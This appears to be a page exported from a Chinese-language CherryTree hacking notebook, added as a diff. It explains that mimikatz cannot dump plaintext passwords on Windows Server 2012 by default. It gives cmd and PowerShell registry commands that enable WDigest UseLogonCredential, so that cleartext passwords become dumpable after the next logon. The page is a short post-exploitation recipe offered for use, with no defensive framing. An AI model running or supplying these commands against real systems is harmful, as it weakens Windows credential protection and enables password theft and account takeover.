@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>无法导出明文</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>无法导出明文</h1><br/>Windows Server 2012默认无法使用mimikatz导出明文口令<br />部分Windows Server 2008也一样<br /><br />解决方法：启用Wdigest Auth<br />cmd:<br /><div class="codebox"><div class="codebox">reg&nbsp;add&nbsp;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&nbsp;/v&nbsp;UseLogonCredential&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;1&nbsp;/f</div></div><br /><br />powershell<br /><br /><br /><div class="codebox"><div class="codebox">Set-ItemProperty&nbsp;-Path&nbsp;HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&nbsp;-Name&nbsp;UseLogonCredential&nbsp;-Type&nbsp;DWORD&nbsp;-Value&nbsp;1</div></div><br /><br />重启或者用户再次登录，能够导出明文口令<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
